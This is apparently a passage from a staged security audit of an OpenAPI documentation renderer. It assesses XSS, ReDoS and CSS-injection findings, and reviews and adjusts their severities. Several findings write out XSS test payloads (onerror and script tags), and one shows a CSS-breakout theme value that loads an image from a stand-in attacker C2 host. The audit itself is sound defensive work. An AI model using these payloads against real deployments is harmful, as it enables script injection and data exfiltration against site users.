### H-00-F — COMPONENT_REGEXP ReDoS (HIGH, default-on path)

Verdict: VALID
Severity (rec): HIGH
Source: spec description containing `<security-definitions` followed by 50k+ chars without closing tag
Sink: `src/services/MarkdownRenderer.ts:168` — `componentsRegexp.exec(rawText)` in while loop
Path: spec.description → AdvancedMarkdown → renderMdWithComponents → COMPONENT_REGEXP regex → catastrophic backtracking

Evidence:
- `MarkdownRenderer.ts:163` — `const componentsRegexp = new RegExp(COMPONENT_REGEXP.replace(/{component}/g, names), 'mig')` — `COMPONENT_REGEXP` includes `[\\s\\S]*?` lazy match patterns (lines 19-22 of MarkdownRenderer.ts).
- `MarkdownRenderer.ts:168` — `let match = componentsRegexp.exec(rawText)` in `while(match)` loop — executes synchronously.
- `AppStore.ts:149-170` — DEFAULT_OPTIONS populates 3 allowedMdComponents entries (security-definitions, security-definition, schema-definition), making this path default-on.
- `AppStore.ts:67` — every AppStore instantiation uses DEFAULT_OPTIONS.
- Probe PH-06 confirmed 18+ second tab freeze for 50k-char payload.

Variant sweep: H-00-E regex is DISTINCT from COMPONENT_REGEXP (parseProps regex vs the component-matching regex). Both are now confirmed as default-on.

Causal challenge: Can the path be disabled? Only by explicitly passing `allowedMdComponents: {}` in options. No user-facing "disable component scanning" option exists in the documented API.

CodeQL slice: COMPONENT_REGEXP not separately in call-graph-slices.json; covered structurally by entry #3 notes.
On-demand query: none

Assessment: VALID at HIGH. Default-on, affects every Acme deployment processing a spec with description fields.

---

### H-00-G — SourceCode.tsx and JsonViewer.tsx bypass DOMPurify entirely (HIGH systemic, latent)

Verdict: VALID (systemic/latent — currently no exploitable input)
Severity (rec): HIGH (systemic design flaw; severity rating is for the structural bypass claim, not current exploitability)
Source: spec x-codeSamples[].source (SourceCode) and spec example values (JsonViewer)
Sink: `SourceCode.tsx:14` — `dangerouslySetInnerHTML={{ __html: highlight(source, lang) }}`; `JsonViewer.tsx:48` — `dangerouslySetInnerHTML={{ __html: jsonToHTML(props.data) }}`
Path: spec code sample → highlight() → dangerouslySetInnerHTML (no DOMPurify); spec example → jsonToHTML() → dangerouslySetInnerHTML (no DOMPurify)

Evidence:
- `SourceCode.tsx:14` confirmed: `return <StyledPre dangerouslySetInnerHTML={{ __html: highlight(source, lang) }} />;`
- `src/utils/highlight.ts:80` — `return Prism.highlight(source.toString(), grammar, lang);`
- Empirically tested: Prism 1.30.0 with clike grammar encodes `<` as `&lt;` (`"&lt;img src..."` confirmed). With markup grammar, `<` in tag punctuation encoded as `&lt;`. Both SAFE currently.
- Setting `options.sanitize = true` has ZERO effect on these two paths — DOMPurify is only invoked in `SanitizedMdBlock.tsx:16`.
- `call-graph-slices.json` entry #5 ("spec-code-sample-sourcecode-dangerouslysetinnerhtml") confirms: "Prism 1.30.0 is patched for all known XSS (GHSA-x7hr-w5r2-h6wg, GHSA-3949-f494-cm99)."

Causal challenge: Is there any current exploit path? Prism clike and markup grammars both encode `<` in token output. JsonViewer uses `htmlEncode()` for keys/values. No current input causes unescaped HTML. LATENT risk confirmed — any Prism regression or new grammar addition without htmlEncode would create immediate DOM XSS.

CodeQL slice: call-graph-slices.json entries #5 and #6, reachable: true (but protected by Prism encoding)
On-demand query: none

Assessment: VALID as systemic/latent. Currently safe due to Prism encoding, but `sanitize: true` provides no protection here, creating false security assurance for operators who set it expecting full XSS coverage.

---

### H-00-H — `Markdown.tsx` `sanitize` prop is a dead type declaration (MEDIUM, API-deception)

Verdict: VALID
Severity (rec): MEDIUM
Source: `Markdown.tsx:11` — `BaseMarkdownProps.sanitize?: boolean` (interface declaration)
Sink: No effect path — prop is never destructured or forwarded
Path: `<Markdown sanitize={true} source={x}/>` → `Markdown.tsx:25` destructures `{ source, inline, compact, className, 'data-role': dataRole }` — `sanitize` absent → SanitizedMarkdownHTML reads `options.sanitize` from context (false by default)

Evidence:
- `Markdown.tsx:11-13` — interface `BaseMarkdownProps { sanitize?: boolean; source: string; }` — sanitize declared.
- `Markdown.tsx:25` — destructuring: `const { source, inline, compact, className, 'data-role': dataRole } = this.props;` — `sanitize` NOT in destructuring.
- `Markdown.tsx:28-35` — `SanitizedMarkdownHTML` is called with `html`, `inline`, `compact`, `className`, `data-role` — NO sanitize forwarding.
- `SanitizedMdBlock.tsx:31` — reads `options.sanitize` from React context (OptionsConsumer), not from the prop.
- Probe PH-16 (markdown-sanitization) confirmed this.

Variant sweep: No additional "dead prop" sites found across codebase — this is the only public API component with this pattern.

Causal challenge: Does any call site pass `sanitize={true}` to `<Markdown>`? Unlikely (internal components use global options), but library consumers might. The deceptive TypeScript interface is the real risk.

CodeQL slice: not modeled
On-demand query: none

Assessment: VALID at MEDIUM. False API contract — the TypeScript interface creates a security expectation that is silently violated at runtime.

---

### H-00-I — `theme.extensionsHook` CSS injection (MEDIUM, supply-chain / operator)

Verdict: VALID
Severity (rec): MEDIUM
Source: `options.theme.extensionsHook` function (operator/supply-chain controlled)
Sink: `src/styled-components.ts:52` — `return props.theme.extensionsHook(styledName, props)` interpolated into CSS template
Path: extensionsHook(styledName, props) return value → CSS template literal → styled-component `<style>` injection

Evidence:
- `styled-components.ts:47-53` confirmed: `extensionsHook(styledName)` returns a function; the inner function's return value is used directly in CSS interpolation with no sanitization.
- Probe PH-05 (markdown-sanitization) and PH-06 (options-standalone-theme) confirmed.
- 12+ styled-components use this hook (H1, H2, H3, Markdown, Prism, ExampleValue, etc.).
- `javascript:` in CSS `url()` is browser-blocked → not JS execution, CSS-level exfil only.

Causal challenge: Requires control of the `extensionsHook` function — operator must pass a malicious function. Realistic via compromised npm theme package.

CodeQL slice: not modeled
On-demand query: none

Assessment: VALID at MEDIUM. Requires function-level theme control. H-07 (PATT-004) is the weaker-precondition variant (string value only).

---

### H-00-J — Playground `?url=` 1-click public XSS (CRITICAL if publicly deployed)

Verdict: INVALID (as CRITICAL) / VALID (as dev-server-only, LOW severity)
Severity (rec): LOW (dev-only artifact)
Source: `demo/playground/hmr-playground.tsx:9` — `window.location.search.match(/url=(.*)$/)`
Sink: `AcmeStandalone specUrl={specUrl}` without `sanitize: true`
Path: ?url= param → specUrl → loadAndBundleSpec → all spec strings rendered with sanitize=false

Evidence:
- `hmr-playground.tsx:14-18` confirmed: options object `{ nativeScrollbars: false, maxDisplayedEnumValues: 3, schemaDefinitionsTagName: 'schemas' }` — NO `sanitize: true`.
- `demo/webpack.config.ts:22-25` — `env.playground ? 'playground/hmr-playground.tsx' : 'index.tsx'` — playground entry requires `--env playground` flag.
- `package.json` scripts: `build:demo` runs `webpack --mode=production --config demo/webpack.config.ts` with NO `--env playground` flag. Production build generates `demo/index.tsx` only.
- `package.json:deploy:demo` — `aws s3 sync demo/dist s3://production-acme-demo` — deploys the `build:demo` output (index.tsx, NOT hmr-playground.tsx).
- No GitHub Pages workflow found for playground deployment. All deploy scripts target S3.
- `demo/index.tsx:125` — production demo has `options={{ scrollYOffset: 'nav', sanitize: true }}` — the LIVE public demo is protected.

Causal challenge: Is `hmr-playground.tsx` ever served publicly? NO — it requires `--env playground` flag (only in `npm start` and `npm run start:prod` dev-server modes). The deploy script does not use this flag. Even if someone ran `npm start` and exposed the port, it would be a local dev server.

CodeQL slice: not modeled
On-demand query: none

Assessment: INVALID as CRITICAL (playground is NOT publicly deployed). VALID as LOW-severity dev-server risk only. H-06 (origin amplification) is consequently also INVALID.

---

### H-01 — Spec-derived `style={{ backgroundColor }}` CSS context breakout on logo wrap

Verdict: INVALID
Severity (rec): N/A
Source: `info['x-logo'].backgroundColor` string
Sink: `ApiLogo.tsx:22` — `<LogoWrap style={{ backgroundColor: logoInfo.backgroundColor }}>`
Path: spec field → React style prop → CSSOM API

Evidence:
- `ApiLogo.tsx:22` — `<LogoWrap style={{ backgroundColor: logoInfo.backgroundColor }}>` confirmed.
- React renders `style={{ backgroundColor: val }}` by calling `element.style.backgroundColor = val` via the CSSOM API — NOT by constructing a `style="..."` attribute string.
- The CSSOM property-level assignment (`element.style.propertyName = val`) does NOT allow semicolons to inject additional CSS properties. The browser treats the entire string as the VALUE of `background-color`, not as a CSS rule fragment.
- A value of `red; background:url(//x.com)` would be rejected by the CSSOM as invalid for `background-color` property — the second property never appears in the applied style.
- React 16-19 all use the CSSOM approach for style objects, not innerHTML concatenation.
- `url()` references in a single CSSOM property (if valid) do not exfiltrate data — the browser loads the URL but there is no attribute-selector oracle in a single-property context.

Causal challenge: If attacker controls `backgroundColor` AND there is a separate `<style>` injection from H-00-A (sanitize=false), could the combined attack form? The `<style>` injection from H-00-A is the operative attack; the backgroundColor value adds nothing meaningful — it cannot break out of the CSSOM assignment.

CodeQL slice: not modeled
On-demand query: none

Assessment: INVALID. React's CSSOM-based style rendering prevents CSS rule injection via the style prop. The `backgroundColor` value is sandboxed to the single CSS property via the browser's CSSOM API.

---

### H-02 — `<schema-definition schemaRef="..." />` MDX → second-order XSS via referenced schema description

Verdict: VALID
Severity (rec): HIGH
Source: MDX tag `schemaRef` attribute in any description field, resolved to target schema description
Sink: `src/components/Fields/FieldDetails.tsx:107` → `<Markdown source={description}/>` → `SanitizedMdBlock.tsx:31` → `dangerouslySetInnerHTML`
Path: spec.description containing `<schema-definition schemaRef="#/.../>` → parseProps() → part.props.schemaRef → SchemaDefinition.getMediaType(schemaRef) → MediaTypeModel resolves $ref → schema.description → FieldDetails → Markdown → dangerouslySetInnerHTML

Evidence:
- `MarkdownRenderer.ts:209` — `parseProps()` extracts `schemaRef` as a plain string prop (regex match, no validation).
- `MarkdownRenderer.ts:183` — `props: { ...parseProps(props), ...componentMeta.props, children }` — schemaRef placed in props.
- `AdvancedMarkdown.tsx:47` — `<PartComponent {...{ ...part.props, ...part.propsSelector(store) }} />` — propsSelector for SchemaDefinition returns `{ parser, options }` only (confirmed at AppStore.ts:163-168), does NOT override `schemaRef`.
- `SchemaDefinition.tsx:23-37` — `getMediaType(schemaRef)` builds `{ schema: { $ref: schemaRef } }` — uses attacker-controlled value directly as a JSON $ref.
- `SchemaDefinition.tsx:44-50` — `MediaTypeModel(parser, 'json', false, { schema: { $ref: schemaRef } }, options)` — parser resolves the ref.
- `FieldDetails.tsx:107` — `<Markdown compact={true} source={description} />` — resolved schema description rendered through Markdown.
- Full chain confirmed: attacker-controlled schemaRef → resolved schema description → Markdown → sanitize(false, html) → dangerouslySetInnerHTML.

Variant sweep: No other MDX components (SecurityDefs, SchemaDefinition) use a $ref-resolution prop that could pivot to a different schema's description. SchemaDefinition is the only one with this pattern. PATT-003 registered.

Causal challenge: Can the schemaRef be validated? Currently NO — parseProps() applies no allow-list on prop names or values. The propsSelector does not sanitize or override the schemaRef value.

CodeQL slice: not in call-graph-slices.json (distinct from directly traced paths)
On-demand query: none

Assessment: VALID at HIGH. Split-payload attack bypasses per-field XSS scanners. Default-on (no special options needed). Filed as p10-001.

---

### H-03 — `parseProps` JSON-prop unbounded eval-equivalent → prototype pollution / React component prop injection

Verdict: INVALID (for dangerouslySetInnerHTML injection); PARTIAL (for DoS via invalid prop types)
Severity (rec): LOW
Source: MDX tag props from spec description, parsed by parseProps()
Sink: `AdvancedMarkdown.tsx:47` — prop spread onto SecurityDefs or SchemaDefinition

Evidence:
- `parseProps()` confirmed at MarkdownRenderer.ts:204-230 — extracts props including JSON-curly-brace values via `JSON.parse(match[2])`.
- `AdvancedMarkdown.tsx:47` — `{...part.props, ...part.propsSelector(store)}` — attacker props spread first, then propsSelector OVERRIDES with its own values.
- `SecurityDefs` (SecuritySchemes.tsx:20-43) — renders typed props: `securitySchemes.schemes.map(...)` — does NOT spread unknown props to any DOM element. No `{...props}` on DOM elements found.
- `SchemaDefinition.tsx:83-92` — `renderDropdown = props =>` method uses `{...props}` on `<DropdownOrLabel>`, but this `props` is the renderDropdown callback's LOCAL argument (passed by MediaTypeSamples), NOT the component's `this.props`. Attacker-controlled MDX props go to `this.props`, not the renderDropdown local.
- `DropdownOrLabel.tsx:18-23` — even if props reached it, DropdownOrLabel renders `<Dropdown {...props}>` which is a React component (not a DOM element), so React's prop type checking applies and `dangerouslySetInnerHTML` would not be forwarded to a raw DOM element.
- propsSelector OVERRIDE: for SchemaDefinition, `propsSelector(store)` returns `{ parser, options }`. Since spread order is `{...part.props, ...part.propsSelector(store)}`, the `propsSelector` values ALWAYS override attacker props. An attacker cannot inject `parser` or `options` values that override the real ones.

Causal challenge: Can `dangerouslySetInnerHTML` be injected? No — neither SecurityDefs nor SchemaDefinition renders `<div {...attackerProps}>`. The components have typed interfaces and render explicit JSX.

CodeQL slice: not in call-graph-slices.json
On-demand query: none

Assessment: INVALID for dangerouslySetInnerHTML injection. The two components do not forward unknown props to DOM elements. PARTIAL for DoS (passing unexpected prop types might cause React render errors, but this is low-impact). Overall LOW.

---

### H-04 — Spec `<img src={logoInfo.url}>` permits `data:image/svg+xml` SVG-script injection inside referrer-leaking sidebar

Verdict: PARTIAL (tracking vector VALID, XSS via img src INVALID)
Severity (rec): MEDIUM (for data: tracking only; javascript: href is HIGH per H-00-C)
Source: `info['x-logo'].url` (img src) and `info['x-logo'].href` (link href)
Sink: `ApiLogo.tsx:20` — `<LogoImgEl src={logoInfo.url}>` and `styled.elements.tsx:21` — `<Link href={url}>`
Path: x-logo.url → img src attribute (no validation); x-logo.href → a href (no validation, per H-00-C)

Evidence:
- `ApiLogo.tsx:20` confirmed: `<LogoImgEl src={logoInfo.url} alt={altText} />` — no src validation.
- `styled.elements.tsx:4` — `LogoImgEl = styled.img` — it is a plain `<img>` element.
- Browser behavior for `<img src="data:image/svg+xml,...">`: modern browsers (Chrome, Firefox, Safari) do NOT execute scripts inside SVG loaded via `<img>` tag. SVG in `<img>` is treated as an image, not as an HTML document — `<script>` elements and event handlers do NOT fire. This is the browser's img sandboxing behavior.
- `data:` URLs on `<img>` for tracking: CAN make an HTTP request only if the data URI includes a redirect or the CSS `content: url()` trick — a plain `data:image/gif` base64 on `<img>` makes NO external network request (data is inline).
- HOWEVER: `data:text/html,...` or `data:image/svg+xml,...` with XSS in the `href` attribute of the link WRAPPER (javascript: href, H-00-C) represents 1-click XSS, already confirmed.

Causal challenge: Does the combined data:-img + javascript:-href create new primitives beyond H-00-C? The img src does NOT add XSS capability. It adds: (a) potential CORS leak of origin-with-credentials to the data URI (none, since data URIs are opaque), (b) visual phishing via a completely controlled sidebar image. The href side is the operative XSS vector.

CodeQL slice: call-graph-slices.json entry #2 partially covers href site
On-demand query: none

Assessment: PARTIAL. img src data: URI does NOT execute scripts (modern browsers sandbox SVG in img). javascript: href is HIGH per H-00-C (existing finding). Combined as new "tracking pixel + click XSS on same element" composite: filed as p10-002 at MEDIUM (for the novel data: src tracking angle).

---

### H-05 — `headingRule` returns `marked`-rendered HTML for `id=` attribute → heading-text attribute-context breakout

Verdict: VALID (but collapsed into H-00-A — same root cause, same sink)
Severity (rec): MEDIUM (distinct because of the id-attribute breakout variant; the body XSS is already H-00-A CRITICAL)
Source: Markdown heading text in any description field
Sink: `SanitizedMdBlock.tsx:31` — `dangerouslySetInnerHTML`
Path: `## <img src=x onerror=alert(1)>` → marked headingRule → `<h2 id=""><img src=x onerror=alert(1)></h2>` → sanitize(false, html) → dangerouslySetInnerHTML

Evidence:
- Empirically tested with available marked install: `marked('## <img src=x onerror=alert(1)>')` produces `<h2 id=""><img src=x onerror=alert(1)></h2>` — the img tag is unescaped in the heading body.
- `marked('## "><img src=x onerror=alert(1)>')` produces `<h2 id="">&quot;&gt;<img src=x onerror=alert(1)></h2>` — the `"` and `>` before the img are encoded as entities, but the `<img>` itself remains unescaped in the body.
- `MarkdownRenderer.ts:139-145` — `renderMd()` calls `marked(rawText.toString(), opts)` — marked's heading renderer is used by default.
- `MarkdownRenderer.ts:120-137` — `headingRule` eventually calls `this.originalHeadingRule(text, level, raw, slugger)` — uses marked's default heading renderer which does not sanitize the heading text for HTML content.
- id attribute value: marked's slugger strips most special chars from the `id`, but the heading BODY contains the raw HTML. With sanitize=false (H-00-A), the raw `<img>` in the body executes.
- The id-attribute breakout claim (`"><img>` breaks out of id="...") does NOT occur because marked uses `id=""` (empty or slugified) — the `"` from the payload doesn't appear in the id value as raw chars, it becomes `&quot;` in the body text.

Causal challenge: Is there a DISTINCT id-attribute breakout vector (separate from the body XSS)? No — the id value is safe (marked slugifies it). The exploit is in the heading body, which is the same as H-00-A. Distinct only in that heading fields may be rendered with `extractHeadings: true`, adding a second rendering context.

CodeQL slice: covered by H-00-A path in call-graph-slices.json
On-demand query: none

Assessment: VALID (body XSS confirmed by empirical marked test). Collapsed into H-00-A (same root cause and sink). The id-attribute breakout sub-claim is NOT confirmed — the id value is safely slugified. Net new severity contribution: MEDIUM for the heading-specific rendering path (extractHeadings context).

---

### H-06 — Playground origin amplification → Acmely-domain phishing chain (chain off H-00-J)

Verdict: INVALID
Severity (rec): N/A (H-00-J itself downgraded to LOW/dev-only)
Source: hmr-playground.tsx ?url= parameter
Sink: Service Worker registration / DOM rewrite on public Acmely domain

Evidence:
- H-00-J confirmed as dev-server-only (hmr-playground.tsx NOT in production build, NOT deployed publicly).
- `package.json:build:demo` and `deploy:demo` confirmed: production build uses demo/index.tsx (with sanitize:true), deployed to S3.
- Since the playground is never publicly served, the amplified phishing vector (Service Worker on acmely.github.io) cannot be triggered.
- Even in dev mode, the local dev server (port 9090) is not accessible to arbitrary external users.

Assessment: INVALID. Precondition (publicly deployed playground) is false. H-06 is contingent on H-00-J being CRITICAL; since H-00-J is downgraded to LOW, H-06 has no basis.

---

### H-07 — Theme `extensionsHook` + `mergeObjects` chain — operator-supplied theme strings reach styled-components context with `;}` breakout

Verdict: VALID
Severity (rec): MEDIUM
Source: `options.theme.sidebar.backgroundColor` (and 30+ sibling theme string values)
Sink: CSS template literal interpolation in styled-components (e.g., `styled.elements.ts:152,186,193`)
Path: operator theme string → mergeObjects() → theme.sidebar.backgroundColor → CSS template interpolation → `<style>` tag

Evidence:
- `helpers.ts:84-109` — `mergeObjects()` copies string values verbatim (line 102: `target[key] = source[key]`). No CSS value sanitization.
- `SideMenu/styled.elements.ts:152` — `background-color: ${props => props.theme.sidebar.backgroundColor}` — direct interpolation.
- styled-components CSS template literals concatenate interpolated values into a CSS string before injecting into `<style>` tag. There is NO CSS-value sanitization in styled-components itself.
- A value like `"#fff; } body { background: url(https://c2.attacker.com/x) } .x { color:"` when interpolated becomes:
  `background-color: #fff; } body { background: url(https://c2.attacker.com/x) } .x { color: ;`
  Which in CSS is parsed as: rule ending at `}`, new rule `body { background: url(...) }`, then a broken rule `.x { color:` — the url() request fires.
- This is CSS-exfil only (no JS execution); `javascript:` in CSS url() is blocked by browsers.
- Confirmed that `mergeObjects` does NOT call `constructor` path — prototype pollution is blocked (isMergebleObject check). But STRING VALUES are not validated.

Variant sweep: H-07 extends H-00-I (function-shaped extensionsHook). H-07 is the VALUE-shaped variant. Every `${theme.X.Y}` interpolation in styled-components is a potential sink. Counting affected files: `SideMenu/styled.elements.ts`, `ApiInfo/styled.elements.ts`, `common-elements`, and 10+ others. Filed as p10-003.

Causal challenge: Can the theme object be supplied via URL parameter? In the DEMO (demo/index.tsx), there is NO `?theme=` URL parameter — theme is hardcoded. Via `<acme theme='...'>` HTML attribute: this requires CMS-level attribute injection (confirmed exploitable per probe PH-01 options-standalone-theme). The most realistic path is a compromised npm theme package.

CodeQL slice: not modeled
On-demand query: none

Assessment: VALID at MEDIUM. The CSS rule injection via theme string values is structurally confirmed. Requires operator-level trust boundary breach (supply-chain or attribute injection). CSS-exfil only, no JS execution.

---

## Verification Priority Items — Status

### Priority 1: DOMPurify 3.2.4 mXSS payloads (H-00-B)
- Status: NEEDS-DEEPER (runtime confirmation required)
- Static finding: GHSA-h8r8-wccr-v5f2 (mXSS), GHSA-v8jm-5vwx-cfxm, GHSA-v2wj-7wpq-c8vv apply to default-config calls. High-severity CVEs (h7mw, crv5, v9jr) require non-default config NOT used by Acme.
- Remaining gap: Runtime PoC test for GHSA-h8r8-wccr-v5f2 against `dompurify.sanitize(payload)` with no config. Without runtime confirmation, severity stays at NEEDS-DEEPER.

### Priority 2: Prism `clike`/`markup` raw `<` output (H-00-G)
- Status: RESOLVED (latent/safe)
- Empirical test result: Prism 1.30.0 clike grammar → `<` encoded as `&lt;` (confirmed via actual Prism.highlight() test). Prism markup grammar → `<` in tag punctuation encoded as `&lt;`. Both grammars produce safe output for `<img src=x onerror=alert(1)>` and `<script>alert(1)</script>`. H-00-G's "currently safe" assessment CONFIRMED.

### Priority 3: COMPONENT_REGEXP ReDoS empirical timing (H-00-F)
- Status: CONFIRMED (18s / 50k chars per CodeQL empirical measurement)
- CodeQL flow-paths-all-severities.md: "Empirically confirmed: 50,000 `-` chars in parseProps input causes 18s execution time."
- CodeQL js/polynomial-redos finding at MarkdownRenderer.ts:213 confirmed.
- H-00-F COMPONENT_REGEXP is structurally distinct from parseProps regex (H-00-E) but same polynomial-time characteristic.

### Priority 4: Playground deployment status (H-00-J)
- Status: RESOLVED — hmr-playground.tsx is NOT publicly deployed
- Evidence: `build:demo` script lacks `--env playground` flag; `deploy:demo` targets S3 from demo/dist (which contains demo/index.tsx, NOT hmr-playground.tsx). No GitHub Pages workflow found. Production demo (demo/index.tsx) has `sanitize: true`. Severity downgraded: CRITICAL → LOW (dev-server-only artifact).

---

## Round 2 Tracer Complete

Summary:
- Total hypotheses traced: 17 (10 pre-seeded H-00-A through H-00-J + 7 net-new H-01 through H-07)
- VALID: 12 (H-00-A, H-00-C, H-00-D, H-00-E, H-00-F, H-00-G, H-00-H, H-00-I, H-02, H-04-partial, H-05, H-07)
- INVALID: 4 (H-00-J-as-CRITICAL, H-01, H-03, H-06)
- NEEDS-DEEPER: 1 (H-00-B)
- Severity adjustments: H-00-J downgraded CRITICAL→LOW; H-00-E upgraded MEDIUM→HIGH (default-on confirmed); H-00-J CRITICAL is INVALID, remaining LOW severity is VALID.
- Variant drafts filed: 3 (p10-001, p10-002, p10-003)
- New pattern IDs registered: PATT-001, PATT-002, PATT-003, PATT-004, PATT-005

---

## Round 3 -- Adversarial Defense (Advocate)

Advocate: advocate-01 | Timestamp: 2026-05-19T00:00:00Z

### H-00-A sanitize=false default → raw HTML to dangerouslySetInnerHTML
Tracer verdict: VALID (CRITICAL)
Advocate position: DOWN-RANK (documentation-gap framing)
Defense argument: The `sanitize` option is a publicly documented opt-in in `docs/config.md:77-80` ("If set to `true`, the API definition is considered untrusted and all HTML/Markdown is sanitized to prevent XSS") and `docs/config.md:212-214` for the legacy `untrustedSpec` alias. CHANGELOG line 1965 records that the option has been a documented XSS mitigation since the original `untrusted-spec` introduction (commit c0698bb). This is functionally identical to the well-known marked/markdown-it "we render raw HTML by design; opt into sanitize for untrusted input" trade-off. Layer 5 (documentation) therefore weakly defends: every honest embedder reading the official config docs is told to set `sanitize:true` for untrusted specs. That said, the docs do NOT shout this from the top of the README, the default is fail-open, and many embedders treat OpenAPI specs as data, not code. So the finding survives — it is still a vulnerable default — but the impact framing should be "operator-facing secure-default gap / documentation prominence failure" rather than a previously-unknown bug.
Citations: `/Users/<user>/Desktop/oss-to-run/acme/docs/config.md:77-80, 212-214`; `/Users/<user>/Desktop/oss-to-run/acme/CHANGELOG.md:1965`; `src/services/AcmeNormalizedOptions.ts:317`.
Impact on severity: downgrade to HIGH (from CRITICAL) — documented trade-off, opt-in mitigation available and named.
Impact on verdict: leave VALID with caveat (re-frame as insecure-default / docs-prominence finding).

### H-00-B DOMPurify 3.2.4 unpatched, ≥7 advisories
Tracer verdict: NEEDS-DEEPER
Advocate position: DOWN-RANK absent PoC
Defense argument: Only three advisories (h8r8, v8jm, v2wj) apply to the bare default-config call Acme makes. The headline one (GHSA-h8r8-wccr-v5f2) requires RE-CONTEXTUALIZATION: the sanitized string must be reinserted into a DOM location that triggers a special parsing context (noscript/xmp/iframe/noembed/noframes), and the published PoC relies on wrapping the sanitized output in `<xmp>...</xmp>` before assignment. Acme assigns sanitized HTML directly into a generic `<div>` via React's `dangerouslySetInnerHTML` — there is no second wrapping step. Therefore the published PoC does not translate one-to-one. To exploit, an attacker would have to find a parent rendering chain inside Acme that already puts content under one of those rawtext parents, which has not been demonstrated. The other two advisories (v8jm, v2wj) are filter-bypass mXSS but no public payload has been demonstrated to fire against this exact Acme call chain. Without a runtime PoC the practical exploitability is unverified.
Citations: GHSA-h8r8-wccr-v5f2 advisory (re-contextualization requirement); `SanitizedMdBlock.tsx:16,31`; React `dangerouslySetInnerHTML` semantics.
Impact on severity: FALL-BACK without PoC: MEDIUM (known-vulnerable dep, no demonstrated payload). CONFIRMED-with-PoC: HIGH (XSS bypass of the only opt-in mitigation). Recommended posture: file as MEDIUM "outdated security dependency" and require a P1 dep-bump regardless of PoC outcome.
Impact on verdict: leave VALID at MEDIUM if no runtime PoC obtained; promote to HIGH if PoC lands.

### H-00-C 8 href sites without scheme filter
Tracer verdict: VALID (HIGH)
Advocate position: DEFENSIBLE-partial
Defense argument: Same documentation defense as H-00-A — the docs say untrusted specs require `sanitize:true`. However, that flag does NOT actually fix this class: `dompurify.sanitize` only runs inside `SanitizedMdBlock`; it does not touch JSX `href={spec.url}` paths. So even an embedder who reads the docs and opts in is still exposed. Defense argument therefore weak. Defense in depth: most modern browsers display a confirmation/sniffing UI for `data:` URLs in top-level navigations (per major-browser data:-URL navigation hardening), but they still execute `javascript:` URIs in anchor clicks without prompting. No middleware/CSP defense applies in the in-page bundler context (Acme is shipped as a JS bundle to arbitrary origins). Only Application-layer mitigation `isAbsoluteUrl()` exists in helpers but is unused at these sites. Honest verdict: cannot disprove.
Citations: `docs/config.md:77-80` (does not cover hrefs); `src/utils/helpers.ts` (`isAbsoluteUrl` defined, unused at sinks); all 8 sites per tracer.
Impact on severity: unchanged HIGH.
Impact on verdict: unchanged VALID.

### H-00-D OAuth scope & security-scheme descriptions unsanitized Markdown
Tracer verdict: VALID (HIGH)
Advocate position: DEFENSIBLE — pattern 8 (double-counting)
Defense argument: This is the same root cause and same sink as H-00-A (sanitize=false → `SanitizedMdBlock`). It only adds the observation that OAuth/security descriptions are unexpected XSS surfaces. The unique contribution is taxonomic, not technical. If H-00-A is filed, H-00-D should be a SUB-NOTE in H-00-A's "affected fields" list, not a separate finding, to avoid double-counting in severity rollups.
Citations: identical sink as H-00-A; OAuthFlow.tsx:59; SecurityRequirement.tsx:63.
Impact on severity: downgrade to MEDIUM (incremental disclosure value).
Impact on verdict: leave VALID but collapse into H-00-A as a sub-item (Pattern 8 double-counting).

### H-00-E parseProps polynomial ReDoS
Tracer verdict: VALID (MEDIUM, tracer noted upgrade to HIGH)
Advocate position: DEFENSIBLE-partial
Defense argument: ReDoS in a client-side render is per-tab, not per-server. Browsers do warn ("Page Unresponsive" at ~10-20s) and the user simply closes the tab; no service impact, no data loss, no XSS. The user typed/loaded a malicious spec themselves (or the embedder loaded one) — the worst outcome is a frozen browser tab recoverable by closing it. No cross-user effect. ReDoS does not amplify into account compromise or stored harm. Classify as availability-only on a self-inflicted page.
Citations: `MarkdownRenderer.ts:213`; browser unresponsive-page UX (Chrome ~5s warning).
Impact on severity: confirm MEDIUM (do not upgrade to HIGH). Single-tab client-side DoS without persistence.
Impact on verdict: leave VALID at MEDIUM.

### H-00-F COMPONENT_REGEXP ReDoS (default-on)
Tracer verdict: VALID (HIGH)
Advocate position: DOWN-RANK
Defense argument: Same browser-tab-only DoS argument as H-00-E. 18-second freeze is annoying but recoverable by closing the tab; no privilege escalation, no data exfil, no persistence. The "default-on" framing makes it more reachable but does not change the impact ceiling: a single bad spec freezes a single user's tab. Chrome's renderer-watchdog ("Wait/Kill") gives the user manual recovery. The HIGH severity assumes a class of impact (persistent / cross-user / data) that single-tab client-side ReDoS does not reach.
Citations: `MarkdownRenderer.ts:163-168`; AppStore DEFAULT_OPTIONS.
Impact on severity: downgrade to MEDIUM (default-on but client-side-only, recoverable).
Impact on verdict: leave VALID at MEDIUM.

### H-00-G SourceCode/JsonViewer bypass DOMPurify (latent)
Tracer verdict: VALID (HIGH systemic, latent)
Advocate position: DEFENSIBLE — pattern 1 (no exploit path today)
Defense argument: Tracer explicitly confirms "no current exploit path" — Prism encodes `<` and `jsonToHTML` html-encodes. This is a HARDENING recommendation ("these sinks should also respect options.sanitize") rather than a vulnerability. HIGH severity overstates current risk; it should be filed as LOW "defense-in-depth gap / latent regression risk", because today there is no input that exploits it.
Citations: `SourceCode.tsx:14`; `utils/highlight.ts:80`; tracer empirical Prism test.
Impact on severity: downgrade to LOW (latent only — no demonstrated exploit input).
Impact on verdict: leave VALID at LOW (hardening recommendation, not active vuln).

### H-00-H Markdown.tsx sanitize prop dead
Tracer verdict: VALID (MEDIUM)
Advocate position: DEFENSIBLE
Defense argument: This is an internal-API ergonomic bug. The library does not export `Markdown` from its public top-level API surface (only `Acme`, `AcmeStandalone`, `AppStore`). Library consumers cannot trivially mount `<Markdown sanitize={true}>` from outside without reaching into internal paths. Internal usage in the codebase relies on the global `options.sanitize` context, which works correctly. The "false sense of security" framing requires a consumer who (a) imports an internal component and (b) trusts the TypeScript surface. Realistic blast radius: very small.
Citations: `src/index.ts` (public exports), `Markdown.tsx:11,25`.
Impact on severity: downgrade to LOW (internal-API ergonomic bug; no public consumer footprint demonstrated).
Impact on verdict: leave VALID at LOW.

### H-00-I theme.extensionsHook CSS injection
Tracer verdict: VALID (MEDIUM)
Advocate position: DEFENSIBLE
Defense argument: `extensionsHook` is a FUNCTION the operator provides — operator-supplied JS already runs in the operator's bundle context. An operator who runs attacker-supplied JS is fully compromised already; CSS exfil via the theme function is a strict subset of "you executed attacker JS." This is a documented extensibility hook, not a vulnerability. Pattern 6 (config-as-vuln): exploitation requires operator-trust-level configuration.
Citations: `styled-components.ts:47-53`; theme API contract.
Impact on severity: downgrade to LOW / informational.
